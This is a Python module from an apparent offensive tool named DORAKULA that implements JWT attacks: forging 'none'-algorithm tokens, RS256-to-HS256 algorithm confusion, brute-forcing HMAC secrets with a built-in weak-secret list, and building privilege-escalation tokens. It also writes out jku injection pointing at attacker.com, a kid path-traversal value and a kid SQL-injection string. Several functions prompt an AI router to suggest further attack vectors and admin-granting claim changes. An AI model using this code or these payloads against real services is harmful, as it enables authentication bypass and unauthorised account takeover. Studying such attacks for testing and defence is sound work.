#!/usr/bin/env python3
"""DORAKULA JWT Analyzer - JSON Web Token Security Testing & Exploitation

Comprehensive JWT security testing module covering token analysis,
algorithm confusion attacks, none algorithm bypass, weak secret brute
force, and AI-assisted token forging. Implements JWT operations without
external jwt library using base64 + hmac.
"""

import asyncio
import base64
import hashlib
import hmac
import json
import logging
import re
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urlparse, quote

logger = logging.getLogger(__name__)


class JWTAnalyzer:
    """Advanced JWT security analyzer with algorithm confusion and forging.

    Analyzes JWT tokens for security vulnerabilities including none algorithm
    bypass, RS256-to-HS256 algorithm confusion, weak secret brute force,
    and provides AI-assisted token forging capabilities.

    Attributes:
        ai_router: AI router instance for intelligent analysis.
        timeout: Default timeout for operations in seconds.
    """

    # Common weak JWT secrets
    COMMON_SECRETS: List[str] = [
        "secret", "password", "123456", "qwerty", "abc123",
        "letmein", "admin", "welcome", "monkey", "master",
        "dragon", "login", "princess", "football", "shadow",
        "sunshine", "trustno1", "iloveyou", "batman", "access",
        "hello", "charlie", "donald", "1234567", "secret1",
        "password1", "1234567890", "test", "key", "jwt_secret",
        "your-256-bit-secret", "super_secret", "my_secret",
        "changeme", "default", "jwt", "token", "api_secret",
        "HS256", "RS256", "ssh-key", "private_key",
        "this is a secret", "s3cr3t", "s3cret", "secr3t",
        "mysecretkey", "my-secret-key", "my_secret_key",
        "signing-key", "signing_key", "signkey",
        "jwt-secret", "jwt_secret", "jwtsecret",
        "app_secret", "app-secret", "application_secret",
        "S3CR3T", "S3CRET", "SECR3T", "SECRET",
        "0123456789", "abcdefgh", "aaaaaaaa", "bbbbbbbb",
    ]

    def __init__(self, ai_router: Any = None, timeout: int = 300):
        """Initialize JWTAnalyzer.

        Args:
            ai_router: AIRouter instance for AI-enhanced operations.
            timeout: Default timeout for brute force operations.
        """
        self.ai_router = ai_router
        self.timeout = timeout
        logger.info("JWTAnalyzer initialized with timeout=%d", timeout)

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        """Base64url encode bytes without padding.

        Args:
            data: Bytes to encode.

        Returns:
            Base64url-encoded string without padding.
        """
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")

    @staticmethod
    def _b64url_decode(data: str) -> bytes:
        """Base64url decode string with automatic padding.

        Args:
            data: Base64url-encoded string (with or without padding).

        Returns:
            Decoded bytes.

        Raises:
            ValueError: If the input is not valid base64url.
        """
        # Add padding
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        try:
            return base64.urlsafe_b64decode(data)
        except Exception as exc:
            raise ValueError(f"Invalid base64url input: {exc}") from exc

    @classmethod
    def _decode_jwt_parts(cls, token: str) -> Tuple[Dict, Dict, str]:
        """Decode JWT header and payload without verification.

        Args:
            token: JWT token string.

        Returns:
            Tuple of (header_dict, payload_dict, signature_str).

        Raises:
            ValueError: If token format is invalid.
        """
        parts = token.strip().split(".")
        if len(parts) != 3:
            raise ValueError(f"Invalid JWT format: expected 3 parts, got {len(parts)}")

        try:
            header = json.loads(cls._b64url_decode(parts[0]))
        except (json.JSONDecodeError, ValueError) as exc:
            raise ValueError(f"Invalid JWT header: {exc}") from exc

        try:
            payload = json.loads(cls._b64url_decode(parts[1]))
        except (json.JSONDecodeError, ValueError) as exc:
            raise ValueError(f"Invalid JWT payload: {exc}") from exc

        signature = parts[2]
        return header, payload, signature

    @classmethod
    def _encode_jwt(cls, header: Dict, payload: Dict, signature: str = "") -> str:
        """Encode JWT header and payload to token string.

        Args:
            header: JWT header dictionary.
            payload: JWT payload dictionary.
            signature: Signature string (default empty for unsigned).

        Returns:
            Encoded JWT token string.
        """
        header_b64 = cls._b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
        payload_b64 = cls._b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
        return f"{header_b64}.{payload_b64}.{signature}"

    @classmethod
    def _sign_hs256(cls, header: Dict, payload: Dict, secret: str) -> str:
        """Sign a JWT with HS256 algorithm.

        Args:
            header: JWT header dictionary.
            payload: JWT payload dictionary.
            secret: Secret key for HMAC-SHA256.

        Returns:
            Complete signed JWT token string.
        """
        header_b64 = cls._b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
        payload_b64 = cls._b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
        signing_input = f"{header_b64}.{payload_b64}".encode("utf-8")
        signature = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
        signature_b64 = cls._b64url_encode(signature)
        return f"{header_b64}.{payload_b64}.{signature_b64}"

    @classmethod
    def _verify_hs256(cls, token: str, secret: str) -> bool:
        """Verify a JWT token with HS256 algorithm.

        Args:
            token: JWT token string.
            secret: Secret key for HMAC-SHA256.

        Returns:
            True if signature is valid, False otherwise.
        """
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return False
            signing_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
            expected_sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
            actual_sig = cls._b64url_decode(parts[2])
            return hmac.compare_digest(expected_sig, actual_sig)
        except (ValueError, KeyError):
            return False

    async def analyze(self, token: str) -> Dict[str, Any]:
        """Decode and analyze JWT token structure and security posture.

        Performs comprehensive analysis of the JWT including header inspection,
        payload claims extraction, expiration checks, and security issue
        identification.

        Args:
            token: JWT token string to analyze.

        Returns:
            Dictionary containing:
                - header: Decoded JWT header
                - payload: Decoded JWT payload
                - signature_info: Signature analysis
                - security_issues: Identified security vulnerabilities
                - claims_analysis: Analysis of token claims
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "header": {},
            "payload": {},
            "signature_info": {},
            "security_issues": [],
            "claims_analysis": {},
            "errors": [],
        }

        try:
            header, payload, signature = self._decode_jwt_parts(token)
            results["header"] = header
            results["payload"] = payload
        except ValueError as exc:
            results["errors"].append(f"Token decode error: {exc}")
            return results

        # Header analysis
        algo = header.get("alg", "none")
        results["signature_info"] = {
            "algorithm": algo,
            "type": header.get("typ", "JWT"),
            "kid": header.get("kid", "not present"),
            "jku": header.get("jku", "not present"),
            "x5u": header.get("x5u", "not present"),
        }

        # Security issue checks
        if algo.lower() == "none":
            results["security_issues"].append({
                "issue": "none_algorithm",
                "severity": "critical",
                "description": "JWT uses 'none' algorithm - no signature verification",
            })

        if algo.lower() == "hs256" and not header.get("kid"):
            results["security_issues"].append({
                "issue": "no_key_id",
                "severity": "medium",
                "description": "No kid header - key rotation and identification not supported",
            })

        if header.get("jku"):
            results["security_issues"].append({
                "issue": "jku_header",
                "severity": "high",
                "description": "JKU header present - potential for JWK injection attack",
            })

        if header.get("x5u"):
            results["security_issues"].append({
                "issue": "x5u_header",
                "severity": "high",
                "description": "X5U header present - potential for X.509 URL injection",
            })

        if algo.startswith("RS") or algo.startswith("ES"):
            results["security_issues"].append({
                "issue": "asymmetric_algorithm",
                "severity": "medium",
                "description": f"Algorithm {algo} may be vulnerable to algorithm confusion (RS->HS)",
            })

        # Payload analysis
        import time as time_mod
        current_time = int(time_mod.time())

        if "exp" in payload:
            exp_time = payload["exp"]
            if isinstance(exp_time, (int, float)):
                if exp_time < current_time:
                    results["claims_analysis"]["exp"] = {
                        "status": "expired",
                        "expired_since": current_time - int(exp_time),
                    }
                    results["security_issues"].append({
                        "issue": "expired_token",
                        "severity": "info",
                        "description": f"Token expired {current_time - int(exp_time)} seconds ago",
                    })
                else:
                    results["claims_analysis"]["exp"] = {
                        "status": "valid",
                        "expires_in": int(exp_time) - current_time,
                    }
            else:
                results["claims_analysis"]["exp"] = {"status": "invalid_format"}

        if "iat" in payload:
            results["claims_analysis"]["iat"] = {
                "issued_at": payload["iat"],
                "age": current_time - payload["iat"] if isinstance(payload["iat"], (int, float)) else "unknown",
            }

        if "nbf" in payload:
            nbf = payload["nbf"]
            if isinstance(nbf, (int, float)) and nbf > current_time:
                results["claims_analysis"]["nbf"] = {
                    "status": "not_yet_valid",
                    "valid_in": int(nbf) - current_time,
                }

        # Check for weak claims
        if "sub" in payload and str(payload["sub"]).lower() in ("admin", "root", "1", "administrator"):
            results["security_issues"].append({
                "issue": "privileged_subject",
                "severity": "high",
                "description": f"Token subject is potentially privileged: {payload['sub']}",
            })

        if "role" in payload and str(payload["role"]).lower() in ("admin", "administrator", "root", "superuser"):
            results["security_issues"].append({
                "issue": "admin_role_in_payload",
                "severity": "high",
                "description": f"Admin role in payload: {payload['role']}",
            })

        # Check for sensitive data in payload
        sensitive_keys = ["password", "secret", "api_key", "token", "credential", "private"]
        for key in payload:
            if any(s in key.lower() for s in sensitive_keys):
                results["security_issues"].append({
                    "issue": "sensitive_data_in_payload",
                    "severity": "high",
                    "description": f"Potentially sensitive data in claim: {key}",
                })

        # Check signature length for weak secrets
        try:
            sig_bytes = self._b64url_decode(signature)
            results["signature_info"]["length_bytes"] = len(sig_bytes)
        except ValueError:
            results["signature_info"]["length_bytes"] = "invalid"

        # AI analysis
        if self.ai_router:
            try:
                ai_result = await self.ai_router.query(
                    f"Analyze this JWT token for security vulnerabilities and "
                    f"suggest attack vectors:\n"
                    f"Header: {json.dumps(header, indent=2)}\n"
                    f"Payload: {json.dumps(payload, indent=2)}\n"
                    f"Algorithm: {algo}\n"
                    f"Issues found: {json.dumps(results['security_issues'], indent=2)}",
                    context="jwt_analysis"
                )
                results["ai_analysis"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI JWT analysis failed: %s", exc)

        logger.info("JWT analysis complete: %d security issues found",
                     len(results["security_issues"]))
        return results

    async def test_none_algorithm(self, token: str) -> Dict[str, Any]:
        """Test JWT none algorithm bypass vulnerability.

        Creates modified tokens with 'none', 'None', 'NONE', and empty
        algorithm variants to test if the server accepts unsigned tokens.

        Args:
            token: Valid JWT token to modify.

        Returns:
            Dictionary containing:
                - forged_tokens: List of forged token variants
                - test_results: Results of testing each variant
                - vulnerable: Whether the server accepted a none-alg token
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "forged_tokens": [],
            "test_results": [],
            "vulnerable": False,
            "errors": [],
        }

        try:
            header, payload, _ = self._decode_jwt_parts(token)
        except ValueError as exc:
            results["errors"].append(f"Token decode error: {exc}")
            return results

        # Create none-algorithm variants
        none_variants: List[Dict[str, Any]] = [
            {"alg": "none", "typ": "JWT"},
            {"alg": "None", "typ": "JWT"},
            {"alg": "NONE", "typ": "JWT"},
            {"alg": "nOnE", "typ": "JWT"},
            {"alg": "none", "typ": header.get("typ", "JWT")},
            {"alg": "None", "typ": header.get("typ", "JWT")},
        ]

        # Also try with modified payload (privilege escalation)
        escalated_payloads: List[Dict] = []
        if "role" in payload:
            for role in ["admin", "administrator", "root", "superuser"]:
                new_payload = dict(payload)
                new_payload["role"] = role
                escalated_payloads.append(new_payload)

        if "sub" in payload:
            for sub in ["admin", "administrator", "root", "1"]:
                new_payload = dict(payload)
                new_payload["sub"] = sub
                escalated_payloads.append(new_payload)

        # Generate forged tokens
        forged: List[Dict[str, Any]] = []

        # Basic none-alg tokens with original payload
        for variant in none_variants:
            for sig_suffix in ["", " ", ".", "~"]:
                forged_token = self._encode_jwt(variant, payload, sig_suffix.strip())
                forged.append({
                    "token": forged_token,
                    "algorithm": variant["alg"],
                    "payload_modified": False,
                    "signature_suffix": sig_suffix or "empty",
                })

        # None-alg with escalated payloads
        for variant in none_variants[:2]:
            for esc_payload in escalated_payloads[:4]:
                forged_token = self._encode_jwt(variant, esc_payload, "")
                forged.append({
                    "token": forged_token,
                    "algorithm": variant["alg"],
                    "payload_modified": True,
                    "modifications": {k: esc_payload.get(k) for k in ("role", "sub") if k in esc_payload},
                    "signature_suffix": "empty",
                })

        results["forged_tokens"] = forged

        # AI enhancement
        if self.ai_router:
            try:
                ai_result = await self.ai_router.query(
                    f"Suggest additional JWT none-algorithm bypass techniques "
                    f"for a server that uses algorithm {header.get('alg', 'unknown')}. "
                    f"Include header manipulation, signature tricks, and "
                    f"encoding variations.",
                    context="jwt_none_bypass"
                )
                results["ai_bypass_suggestions"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI none bypass suggestions failed: %s", exc)

        logger.info("None algorithm test: %d forged tokens generated",
                     len(results["forged_tokens"]))
        return results

    async def test_algorithm_confusion(self, token: str, public_key: str) -> Dict[str, Any]:
        """Test RS256-to-HS256 algorithm confusion attack.

        Forges a token using the RSA public key as an HMAC secret,
        exploiting servers that verify RS256 tokens using the public
        key with HMAC instead of RSA signature verification.

        Args:
            token: Valid RS256 JWT token.
            public_key: RSA public key in PEM format.

        Returns:
            Dictionary containing:
                - forged_token: Algorithm confusion forged token
                - attack_details: Details of the confusion attack
                - test_payloads: Different payload modifications tested
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "forged_token": "",
            "attack_details": {},
            "test_payloads": [],
            "errors": [],
        }

        try:
            header, payload, _ = self._decode_jwt_parts(token)
        except ValueError as exc:
            results["errors"].append(f"Token decode error: {exc}")
            return results

        original_alg = header.get("alg", "")

        if not original_alg.startswith("RS") and not original_alg.startswith("ES"):
            results["attack_details"]["note"] = (
                f"Original algorithm is {original_alg}, not asymmetric. "
                f"Algorithm confusion typically targets RS*/ES* tokens."
            )

        # Create HS256 header
        hs256_header = dict(header)
        hs256_header["alg"] = "HS256"

        # Remove key-type indicators from header
        for key in ["x5c", "x5t", "jku", "jwk"]:
            hs256_header.pop(key, None)

        # Sign with public key as HMAC secret
        try:
            # Use the public key PEM as the HMAC secret
            forged_token = self._sign_hs256(hs256_header, payload, public_key)
            results["forged_token"] = forged_token
            results["attack_details"] = {
                "original_algorithm": original_alg,
                "forged_algorithm": "HS256",
                "attack_type": "RS256_to_HS256_confusion",
                "public_key_used_as_secret": True,
                "header_modified": hs256_header,
            }

            # Generate privilege escalation variants
            escalation_variants: List[Dict[str, Any]] = []
            test_modifications: List[Dict[str, Any]] = [
                {"role": "admin"},
                {"role": "administrator"},
                {"sub": "admin"},
                {"sub": "1"},
                {"is_admin": True},
                {"user_type": "admin"},
                {"permissions": ["read", "write", "admin"]},
            ]

            for mod in test_modifications:
                new_payload = dict(payload)
                new_payload.update(mod)
                forged = self._sign_hs256(hs256_header, new_payload, public_key)
                escalation_variants.append({
                    "token": forged,
                    "modifications": mod,
                })

            results["test_payloads"] = escalation_variants

        except (ValueError, TypeError) as exc:
            results["errors"].append(f"Algorithm confusion forging error: {exc}")

        # AI analysis
        if self.ai_router:
            try:
                ai_result = await self.ai_router.query(
                    f"JWT algorithm confusion attack crafted. Original algorithm: {original_alg}. "
                    f"Suggest additional claims modifications that might grant "
                    f"elevated access. Current payload claims: {list(payload.keys())}",
                    context="jwt_algorithm_confusion"
                )
                results["ai_suggestions"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI algorithm confusion suggestions failed: %s", exc)

        logger.info("Algorithm confusion test complete: %d payload variants",
                     len(results["test_payloads"]))
        return results

    async def test_weak_secret(self, token: str, wordlist: str) -> Dict[str, Any]:
        """Brute force JWT secret using wordlist.

        Attempts to crack the JWT secret using the provided wordlist
        and built-in common secrets list.

        Args:
            token: JWT token to crack.
            wordlist: Path to wordlist file for brute forcing.

        Returns:
            Dictionary containing:
                - cracked: Whether the secret was found
                - secret: The discovered secret (if cracked)
                - attempts: Number of attempts made
                - time_elapsed: Time spent cracking
                - errors: List of any errors encountered
        """
        import time as time_mod

        results: Dict[str, Any] = {
            "cracked": False,
            "secret": "",
            "attempts": 0,
            "time_elapsed": 0.0,
            "errors": [],
        }

        try:
            header, payload, _ = self._decode_jwt_parts(token)
        except ValueError as exc:
            results["errors"].append(f"Token decode error: {exc}")
            return results

        algo = header.get("alg", "HS256")
        if not algo.startswith("HS"):
            results["errors"].append(
                f"Token uses {algo} algorithm - brute force only works with HMAC algorithms"
            )
            return results

        start_time = time_mod.monotonic()
        secrets_to_test: List[str] = list(self.COMMON_SECRETS)

        # Load wordlist if provided
        if wordlist:
            try:
                with open(wordlist, "r", encoding="utf-8", errors="replace") as f:
                    for line in f:
                        secret = line.strip()
                        if secret and secret not in secrets_to_test:
                            secrets_to_test.append(secret)
                logger.info("Loaded %d secrets from wordlist", len(secrets_to_test))
            except FileNotFoundError:
                results["errors"].append(f"Wordlist not found: {wordlist}")
            except PermissionError:
                results["errors"].append(f"Permission denied: {wordlist}")
            except OSError as exc:
                results["errors"].append(f"Error reading wordlist: {exc}")

        # Brute force
        async def _check_secret(secret: str) -> Optional[str]:
            """Check a single secret against the token."""
            if self._verify_hs256(token, secret):
                return secret
            return None

        # Process in batches for async
        batch_size = 100
        for i in range(0, len(secrets_to_test), batch_size):
            batch = secrets_to_test[i:i + batch_size]
            tasks = [_check_secret(s) for s in batch]
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)

            results["attempts"] += len(batch)

            for result in batch_results:
                if isinstance(result, str) and result:
                    results["cracked"] = True
                    results["secret"] = result
                    results["time_elapsed"] = round(time_mod.monotonic() - start_time, 3)
                    logger.info("JWT secret cracked: %s (after %d attempts)",
                                result, results["attempts"])
                    return results

            # Yield control periodically
            if i % 1000 == 0 and i > 0:
                await asyncio.sleep(0)

        results["time_elapsed"] = round(time_mod.monotonic() - start_time, 3)

        # AI analysis
        if self.ai_router and not results["cracked"]:
            try:
                ai_result = await self.ai_router.query(
                    f"JWT secret brute force failed after {results['attempts']} attempts. "
                    f"Suggest: 1) Targeted wordlists based on the application context, "
                    f"2) Alternative attack vectors (algorithm confusion, JWK injection), "
                    f"3) Known default secrets for common frameworks. "
                    f"Token header: {json.dumps(header)}",
                    context="jwt_crack_failure"
                )
                results["ai_suggestions"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI JWT crack suggestions failed: %s", exc)

        logger.info("JWT secret test complete: cracked=%s, attempts=%d, time=%.2fs",
                     results["cracked"], results["attempts"], results["time_elapsed"])
        return results

    async def forge_token(self, token: str, claims: Dict[str, Any]) -> Dict[str, Any]:
        """AI-assisted JWT token forging with custom claims.

        Creates forged JWT tokens with modified claims, using AI to
        suggest claim modifications for privilege escalation.

        Args:
            token: Original JWT token to forge from.
            claims: Dictionary of claims to modify or add.

        Returns:
            Dictionary containing:
                - original_claims: Original token claims
                - forged_claims: Modified claims in forged token
                - forged_tokens: List of forged token variants
                - ai_suggestions: AI-suggested claim modifications
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "original_claims": {},
            "forged_claims": {},
            "forged_tokens": [],
            "ai_suggestions": {},
            "errors": [],
        }

        try:
            header, payload, _ = self._decode_jwt_parts(token)
        except ValueError as exc:
            results["errors"].append(f"Token decode error: {exc}")
            return results

        results["original_claims"] = dict(payload)

        # Merge claims
        forged_payload = dict(payload)
        forged_payload.update(claims)
        results["forged_claims"] = dict(forged_payload)

        # Generate forged tokens with different algorithm variants
        forged_variants: List[Dict[str, Any]] = []

        # Variant 1: None algorithm
        none_header = {"alg": "none", "typ": "JWT"}
        forged_variants.append({
            "type": "none_algorithm",
            "token": self._encode_jwt(none_header, forged_payload, ""),
            "algorithm": "none",
            "claims": dict(forged_payload),
        })

        # Variant 2: Keep original algorithm (for replay with modified claims)
        forged_variants.append({
            "type": "original_algorithm_replay",
            "token": self._encode_jwt(header, forged_payload, "REQUIRES_SIGNING"),
            "algorithm": header.get("alg", "unknown"),
            "claims": dict(forged_payload),
            "note": "Token requires proper signing with the secret key",
        })

        # Variant 3: HS256 with common weak secrets
        for weak_secret in ["secret", "password", "123456", "jwt_secret", "key"]:
            hs256_header = {"alg": "HS256", "typ": "JWT"}
            forged = self._sign_hs256(hs256_header, forged_payload, weak_secret)
            forged_variants.append({
                "type": "hs256_weak_secret",
                "token": forged,
                "algorithm": "HS256",
                "secret_used": weak_secret,
                "claims": dict(forged_payload),
            })

        # Variant 4: Remove exp claim for indefinite validity
        if "exp" in forged_payload:
            no_exp_payload = dict(forged_payload)
            del no_exp_payload["exp"]
            forged_variants.append({
                "type": "no_expiration",
                "token": self._encode_jwt(none_header, no_exp_payload, ""),
                "algorithm": "none",
                "claims": no_exp_payload,
                "note": "Token without expiration claim",
            })

        # Variant 5: JWK injection via jku header
        jku_header = dict(header)
        jku_header["jku"] = "https://attacker.com/jwk.json"
        forged_variants.append({
            "type": "jku_injection",
            "token": self._encode_jwt(jku_header, forged_payload, "REQUIRES_SIGNING"),
            "algorithm": header.get("alg", "unknown"),
            "claims": dict(forged_payload),
            "note": "JKU header pointing to attacker-controlled JWK",
        })

        # Variant 6: kid injection
        kid_header = dict(header)
        kid_header["kid"] = "../../dev/null"
        forged_variants.append({
            "type": "kid_path_traversal",
            "token": self._encode_jwt(kid_header, forged_payload, "REQUIRES_SIGNING"),
            "algorithm": header.get("alg", "unknown"),
            "kid": "../../dev/null",
            "claims": dict(forged_payload),
            "note": "kid header with path traversal",
        })

        # Variant 7: SQL injection in kid
        kid_sqli_header = dict(header)
        kid_sqli_header["kid"] = "' OR 1=1--"
        forged_variants.append({
            "type": "kid_sql_injection",
            "token": self._encode_jwt(kid_sqli_header, forged_payload, "REQUIRES_SIGNING"),
            "algorithm": header.get("alg", "unknown"),
            "kid": "' OR 1=1--",
            "claims": dict(forged_payload),
            "note": "kid header with SQL injection",
        })

        results["forged_tokens"] = forged_variants

        # AI enhancement: suggest claim modifications
        if self.ai_router:
            try:
                ai_result = await self.ai_router.query(
                    f"JWT token forging in progress. Original claims: "
                    f"{json.dumps(payload, indent=2)}\n"
                    f"Requested modifications: {json.dumps(claims, indent=2)}\n"
                    f"Suggest additional claim modifications that might grant "
                    f"elevated access or bypass authorization. Consider: "
                    f"RBAC claims, feature flags, tenant IDs, and multi-tenancy.",
                    context="jwt_forging_suggestions"
                )
                results["ai_suggestions"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI forging suggestions failed: %s", exc)

        logger.info("JWT forging complete: %d variants generated",
                     len(results["forged_tokens"]))
        return results
